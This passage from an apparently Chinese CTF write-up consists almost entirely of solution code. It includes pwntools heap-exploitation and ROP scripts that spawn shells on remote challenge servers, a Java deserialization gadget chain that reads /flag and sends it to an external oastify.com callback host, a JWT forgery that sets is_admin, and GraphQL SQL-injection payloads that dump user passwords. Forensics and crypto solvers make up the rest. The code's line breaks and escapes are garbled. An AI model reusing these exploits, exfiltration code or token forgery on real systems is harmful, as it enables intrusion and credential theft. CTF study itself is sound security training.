 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('47.95.3.91',16282) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter('Your choice: ',str(a))
 def add(a,b): choice(1) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Size: ',str(b)) def edit(a,b): choice(2) io.sendlineafter('Index: ',str(a)) io.sendafter('Content: ',b)
 def delete(a): choice(3) io.sendlineafter('Index: ',str(a))

 add(0,0x1000) add(15,0x1000) delete(15) delete(0) add(1,0x20) add(2,0x20) add(3,0x60) add(4,0x40) add(5,0x1000) edit(0,'x00'*0x28+p64(0x501)+'x00'*0x28+p64(0x51)+(p64(0)+p64(0x21))*0x6+p64(0)+p64(0x61)+(p64(0)+p64(0x21))*0x60) delete(3) delete(4) edit(0,'x00'*0x28+p64(0x501)+'x00'*0x28+p64(0x51)+(p64(0)+p64(0x21))*0x6+p64(0)+p64(0x61)+(p64(0)+p64(0x21))*0x60) delete(2) delete(3) delete(4) add(6,0x20) add(7,0x60) add(10,0x450) edit(3,p64((libc.sym['_IO_2_1_stderr_']&0xfff)+0x1000)[:2]) add(8,0x40) add(9,0x40) edit(4,p64((libc.sym['_IO_2_1_stderr_']&0xfff)+libc.sym['__free_hook']-libc.sym['_IO_2_1_stderr_']+0x58+0x1000)[:2]) add(11,0x50) add(12,0x50) edit(12,p64(0x123450)) edit(0,'x00'*0x28+p64(0x3001-(0xe00*2)+0xc0)+'x00'*0x28+p64(0x3001-(0xe00*2)+0xd0)+(p64(0)+p64(0x21))*0x6+p64(0)+p64(0x61)+(p64(0)+p64(0x21))*0xd0) edit(15,(p64(0)+p64(0x21))*0xd0)
 delete(2) delete(3) edit(9,p64(0xfbad1887)+p64(0)*3+'x00') add(13,0x20) gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue

6

queue

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./queue'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' telescope $rebase(0x202040) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('101.201.71.136',14927) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter(': ',str(a))
 def add(a): choice(1) io.sendlineafter('Size: ',str(a)) def edit(a,b,c): choice(2) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Value idx:',str(b)) io.sendlineafter('Value: ',str(c))
 def show(a,b): choice(3) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Num: ',str(b))
 def delete(a): choice(4) io.sendlineafter('Index:',str(a))
 def waigua(a,c): choice(666) io.sendlineafter('Index: ',str(a)) io.sendafter('Content: ',c)
 for i in range(10): add(0x20)
 waigua(0,'x00'*0x10+'x48') show(0,8) io.recvuntil('Content: ') data='' for i in range(6): a=io.recvuntil('n',drop=True) if len(a)=='1': a='0'+a data=a+data heap_addr=int(data,16)
 addr=heap_addr-0x15D8 waigua(0,'x00'*0x10+p64(addr)) show(0,8) io.recvuntil('Content: ') data='' for i in range(6): a=io.recvuntil('n',drop=True) if len(a)=='1': a='0'+a data=a+data
 leak=int(data,16)
 libc_base=leak-(0x3EBCA0) libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook']
 waigua(0,'x00'*0x10+p64(free_hook_addr)*2)
 one=libc_base+0xe54f7 for i in range(6): edit(0,i,(one>>(8*i))&0xff)
 choice(4) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
package com.ctf.ezjava;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.*;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.util.PriorityQueue;
public class cc4 { public static void main(String[] args) throws Exception {
 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass("Cat"); String cmd = "String flag = "";n" + " String str;n" + " java.io.BufferedReader in = new java.io.BufferedReader(new java.io.FileReader("/flag"));n" + " while ((str = in.readLine()) != null) {n" + " flag += str;n" + " }"; cmd += "flag = flag.replace("{","");" + "flag = flag.replace("}","");"; cmd += "java.net.URL url = new java.net.URL("http://"+flag+".xgh92aja87fsginch3ss2fnklbr7fw.oastify.com/");n" + "java.net.HttpURLConnection con = (java.net.HttpURLConnection) url.openConnection();n" + "con.setRequestMethod("GET");n" + "n" + " //添加请求头n" + " con.setRequestProperty("User-Agent", "feng");n" + " int responseCode = con.getResponseCode();"+ ""; // 创建 static 代码块，并插入代码 cc.makeClassInitializer().insertBefore(cmd); String randomClassName = "EvilCat" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错 // 写入.class 文件 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, "_bytecodes", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, "_name", "name"); setFieldValue(templates, "_class", null);
 /** * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个 */ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) });
 TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(2,comparator);
 Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size"); size.setAccessible(true); size.set(queue,2);
 Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator);
 try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4")); outputStream.writeObject(queue); outputStream.close();
 ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } }
 public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); }
 public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; }}
```



```
# import python_jwt as jwt, jwcrypto.jwk as jwk, datetimeimport python_jwt as jwtimport jwcrypto.jwk as jwk, datetimefrom json import loads, dumpsfrom jwcrypto.common import base64url_decode, base64url_encodekey = jwk.JWK.generate(kty='RSA', size=2048)payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}old_payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}token = jwt.generate_jwt(payload, key, 'PS256', datetime.timedelta(minutes=5))token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"[header, payload, signature] = token.split('.')parsed_payload = loads(base64url_decode(payload))parsed_payload['is_admin'] = 1parsed_payload['exp'] = 2000000000fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))token = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'print(token)header, claims = jwt.verify_jwt(token, key, ['PS256'])print(claims)print(old_payload)for k in payload: assert claims[k] == old_payload[k]
```



```
query={ __schema { types { name } }}
```



```
判断出sql注入 然后发现是sqlite 找表找字段query={ getscoreusingnamehahaha(name: "admin' and 1 --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select sqlite_version() --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(name) from sqlite_master where type='table' --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(sql) from sqlite_master where type='table' and name='users'--+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid } }
```



```
POST /graphql HTTP/1.1Host: eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 118Origin: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comConnection: closeReferer: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.com/Cookie: token={" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwMDAwMDAwMDAsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjEsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ","signature":"ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"}X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid  } }# jlrSgkm4lHk1Ya43CaAQ
```



```
python3 volatility3/vol.py -f 1.mem banners.Bannersrogress: 100.00 PDB scanning finished Offset  Banner0x3e6001a0 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x3f191d94 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x710b7c88 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x7bd00010 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)
```



```
https://mp.weixin.qq.com/s/dbHGBzjcMoF8aPqIkCN_FgLinux · volatilityfoundation/volatility Wiki (github.com)
```



```
$ git clone https://github.com/volatilityfoundation/dwarf2json$ cd dwarf2json/$ go buildwget <https://launchpad.net/ubuntu/+archive/primary/+files/linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb>git clone https://github.com/volatilityfoundation/volatility3.git# 使用能适用该内核的操作系统 (ubuntu 18.04 / 20.04 / etc)$ docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash/# cd /volatility//volatility# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility# ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.4.0-84-generic > linux-image-5.4.0-84.94-generic.json $ cp linux-image-5.4.0-84.94-generic.json ./volatility3/volatility3/framework/symbols/linux
```



```
# 建立模拟环境cd ./volatility2/tools/linuxdocker run -it —rm -v $PWD:/volatility ubuntu:20.04 /bin/bash# 安装必须环境apt updateapt install -y linux-headers-5.4.0-84-generic linux-image-5.4.0-84-generic dwarfdump build-essential vim zipcd /volatility/tools/linux/volatility/tools/linux# make/volatility/tools/linux# cd //volatility/tools/linux# zip Linux-5.4.0-84-generic.zip volatility/tools/linux/module.dwarf /boot/System.map-5.4.0-84-generic/volatility/tools/linux# exitmv Linux-5.4.0-84-generic.zip ./volatility2/volatility/plugins/overlays/linux
```



```
sudo volatility -f 1.mem --profile=LinuxUbuntu180484x64 linux_recover_filesystem -D filesystem
```



```
CyberDefenders Write-up: CTF01. This is going to be my write-up for the… | by Nisarg Suthar | Medium
```



```
(TimeStamp_INT, 0 [Reserved], TimeStamp_DEC, 0 [Reserved], type, code [key pressed], value [press/release])
```



```
CTFtime.org / HSCTF 7 / Developer Input / Writeup
```



```
from Crypto.Util.number import *def get_pl(): pl=[] for i in range(100,512): for j in range(10,512//4): for k in range(2,6):                pl.append((i+j)//k) pl=list(set(pl))    return plpl=get_pl()n = 141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393c = 81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883e = 65537def get_P(pl,n): for i in pl: for j in pl: t=(1<<i)+(1<<j) t=t**2+4*n r=gmpy2.iroot(t,2) if r[1]: delta_s=r[0] A=-((1<<i)+(1<<j)) p=(-A+delta_s)//2 assert n%p==0                return pp=get_P(pl,n)q=n//pd=inverse(e,(p-1)*(q-1))m=pow(c,d,n)print(long_to_bytes(m^((p-1)**2)))
```



```
from Crypto.Util.number import *from pwn import *import gmpy2context.log_level = 'debug'p = 2 ** 1024 - 2 ** 234 - 2 ** 267 - 2 ** 291 - 2 ** 403 - 1def get_root(x,p): # g^x==4 mod p gg,a,b=gmpy2.gcdext(x,p-1) if gg==2: t=pow(4,a,p) g=pow(t,(p+1)//4,p) return g elif gg==1:        return pow(4,a,p)s='1'r=remote('47.95.3.91', 42259)while True: r.sendline('t') g=get_root(int(s,2),p) r.sendline(str(g)) r.recvuntil(' desired integer: n') tr=r.recvline() if b'flag' in tr: print(tr) break tt,rr=eval(tr[8:]) if tt==1: s=s+'1' else: if s[-1]=='1': s=s[:-1]+'0'    print(s)r.interactive()
```



```
import hashlibnbits = 32S=492226042629702n = 991125622s=[562734112,859151551,741682801]M = [19621141192340, 39617541681643, 3004946591889, 6231471734951, 3703341368174, 48859912097514, 4386411556216, 11028070476391, 18637548953150, 29985057892414, 20689980879644, 20060557946852, 46908191806199, 8849137870273, 28637782510640, 35930273563752, 20695924342882, 36660291028583, 10923264012354, 29810154308143, 4444597606142, 31802472725414, 23368528779283, 15179021971456, 34642073901253, 44824809996134, 31243873675161, 27159321498211, 2220647072602, 20255746235462, 24667528459211, 46916059974372]m=(s[2]-s[1])*inverse_mod(s[1]-s[0],n)%nc=(s[1]-s[0]*m)%nseed=s[0]s = [0] * nbitss[0]=seedfor i in range(1, nbits):    s[i] = (s[i-1]*m+c)%nfor t in range(nbits):    M[t] = M[t] - s[t]m=matrix(ZZ,nbits+1,nbits+1)for i in range(nbits): m[i,i]=1    m[i,nbits]=M[i]m[nbits,nbits]=-Sr=m.LLL()tmp_m=[str(i) for i in r[-1]]       tmp_m=''.join(tmp_m[:-1])msg=int(tmp_m,2)flag = f'flag{{{hashlib.sha256(str(msg).encode()).hexdigest()}}}'print(flag)
```



```
from Crypto.Util.number import *n=113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301c=64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102e = 65537with open(r'C:UsersAdministratorDesktoptrace.out','r') as f:    l=f.readlines()ll=[]for i in l: if 'a = rshift1(a)' in i or 'a, b = b, a' in i or 'a = a - b' in i or 'b = rshift1(b)' in i:        ll.append(i.strip())ll=ll[::-1]a=1b=0for i in ll: if 'a, b = b, a' in i: a, b = b, a if 'a = rshift1(a)' in i: a=a<<1 if 'b = rshift1(b)' in i: b=b<<1 if 'a = a - b' in i:        a = a + bphi,e=a,bd=inverse(e,phi)print(long_to_bytes(pow(c,d,n)))
```



```
https://github.com/jerryscript-project/jerryscript/blob/c5bc3786cfd4ad2e9217e358227854c5a160e49a/docs/01.CONFIGURATION.md
```



```
python tools/build.py --show-opcodes=ON --snapshot-exec=ON编译时候开启选项./jerry --show-opcodes --exec-snapshot chall.snapshot查看字节码
```



```
ans=[1605062385,-642825121,2061445208,1405610911,1713399267,1396669315,1081797168,605181189,1824766525,1196148725,763423307,1125925868]for i in ans:print(hex(i&0xffffffff)[2:],end=',')print()#5fab4ef1d9af445f7adf285853c7eb9f662065e3533f7b83407aea30241255056cc3ba3d474bc7f52d80ea4b431c43ec
```



```
key=[19088743,2309737967,4275878552,1985229328]for i in key:print(hex(i&0xffffffff)[2:],end=',')print()#0123456789abcdeffedcba9876543210
```



```
#coding:utf-8from pwn import *from ctypes import CDLLimport varintcontext.log_level='debug'elfelf='./protocol'elf=ELF(elfelf)context.arch=elf.archgdb_text='''  '''if len(sys.argv)==1 : io=process(elfelf) gdb_open=1 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]elif sys.argv[1]=='2' : io=process(elfelf) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]else : io=remote('101.201.71.136',28565) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]def gdb_attach(io,a): if gdb_open==1 :    gdb.attach(io,a)def Key(Id, Type):    return varint.encode((Id<<3) | Type)def value_str(cont):    return varint.encode(len(cont))+contdef PacketInt(n):    return varint.encode(n)def Login(name, pwd): io.recvuntil('Login: ') pay = '' pay+= Key(1, 2)+value_str(name) pay+= Key(2, 2)+value_str(pwd)    io.send(pay)# stack overflowdef edit_plus(a,b): len1=len(b) print b for i in range(len1): if b[len1-1-i:len1-i]=='x00': idx=b.find('x00',len1-i,len1) if idx != -1 : note='a'*(len1-i)+b[len1-i:idx]        Login(a,note) else: note='a'*(len1-i)+b[len1-i:]        Login(a,note) note='a'*(len1-i-1)      Login(a,note) if i == len1-1: idx=b.find('x00',0,len1) if idx == -1 : Login(a,b) else :        Login(a,b[:idx])pay = 'admin'+cyclic(579)pay+= p64(0x0000000000588bbe) # pop rsi ; retpay+= p64(0x0000000000817b80) # @ .datapay+= p64(0x00000000005bdb8a) # pop rax ; retpay+= '/bin//sh'pay+= p64(0x00000000005b6835) # mov qword ptr [rsi], rax ; retpay+= p64(0x0000000000588bbe) # pop rsi ; retpay+= p64(0x0000000000817b88) # @ .data + 8pay+= p64(0x00000000006c6a69) # xor rax, rax ; retpay+= p64(0x00000000005b6835) # mov qword ptr [rsi], rax ; retpay+= p64(0x0000000000404982) # pop rdi ; retpay+= p64(0x0000000000817b80) # @ .datapay+= p64(0x0000000000588bbe) # pop rsi ; retpay+= p64(0x0000000000817b88) # @ .data + 8pay+= p64(0x000000000040454f) # pop rdx ; retpay+= p64(0x0000000000817b88) # @ .data + 8pay+= p64(0x00000000006c6a69) # xor rax, rax ; retpay+= p64(0x00000000005bdb8a)pay+= p64(0x3b)pay+= p64(0x0000000000403c99) # syscalledit_plus("admin",pay)edit_plus("admin","admin")# success('libc_base:'+hex(libc_base))# success('heap_base:'+hex(heap_base))gdb_attach(io,gdb_text)io.interactive()
```



```
#coding:utf-8import sysfrom pwn import *import randomfrom ctypes import CDLLcontext.log_level='debug'elfelf='./unexploitable'#context.arch='amd64'while True : try : elf=ELF(elfelf)    context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16      ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('47.95.3.91',38768) gdb_open=0 clibc.srand(clibc.time(0)) # libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 :        gdb.attach(io,a)    io.send('x00'*0x18+'xd1')    pay='x00'*0x18+p32(0x4f302+(random.randint(0,0xfff)<<12))[:3] io.send(pay) sleep(0.1) io.sendline('ls') if 'flag' in io.recv(timeout=0.2) : io.sendline('cat flag')      pause() else : io.close()      continue    io.interactive() except Exception as e: io.close() continue else: continue
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./bitheap'#context.arch='amd64'while True : # try : elf=ELF(elfelf)    context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16      ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('39.106.13.71',18428) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 :        gdb.attach(io,a) def choice(a):      io.sendlineafter('Your choice: ',str(a)) def add(a,b): choice(1) io.sendlineafter('Index: ',str(a))      io.sendlineafter('Size: ',str(b))  def edit(a,b): choice(2) io.sendlineafter('Index: ',str(a))      io.sendafter('Content: ',b) def show(a): choice(3)      io.sendlineafter('Index: ',str(a)) def delete(a): choice(4)      io.sendlineafter('Index: ',str(a)) add(0,0xf8) add(1,0x68) add(2,0x88) add(3,0x68) add(4,0x88) add(5,0xf8) for i in range(7):      add(6+i,0xf8) for i in range(7):      delete(6+6-i) delete(0)    edit(4,'0'*0x80*8+'0'*8*1+'11000000'+'0'*8*6+'0') def code(a): m='' for i in range(64): if a%2==1: m+='1' else: m+='0'        a=a//2      return m delete(5) delete(3) delete(1) add(0,0x130)    show(0)    libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-96-0x10-0x3f0 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rdi_ret_addr=libc.search(asm('pop rdi;ret')).next() pop_rdx_rsi_ret_addr=libc.search(asm('pop rdx;pop rsi;ret')).next() pop_rax=libc.search(asm('pop rax;ret')).next()    syscall_ret=libc.search(asm('syscall;ret')).next() edit(0,'0'*0xf8*8+code(0x71)+code(free_hook_addr)) add(6,0xf8) add(7,0xf8) show(6) io.recvuntil('Content: ')    heap_base=u64(io.recv(6)+'x00x00')-0x100 pay=code(u64('./flagx00x00')) pay=pay.ljust(0x68*8,'0') #pading 0x68 pay+=code(3) #rdi rdi+0x68 pay+=code(0) #rsi rdi+0x70 pay+='0'*8*0x10 #pading 0x88 pay+=code(0) #rdx rdi+0x88 pay+='0'*8*0x10 #pading 0xa0 pay+=code(heap_base+0x100) #rsp rdi+0xa0 pay+=code(pop_rax) #rip rdi+0xa8 pay=pay.ljust(0x800,'0') pay+=code(10000) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(heap_base) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0) pay+=code(0) pay+=code(pop_rax) pay+=code(2) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(3) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(0) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(1) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(1)    pay+=code(syscall_ret) edit(6,pay[:0xf0*8])    edit(7,pay[0x100*8:]) add(1,0x68) add(3,0x68) edit(3,code(libc.sym['setcontext']+53))    delete(6) success('libc_base:'+hex(libc_base))    # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text)    io.interactive() # except Exception as e: # io.close() # continue # else: # continue
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./sandboxheap'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' telescope $rebase(0x202040) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
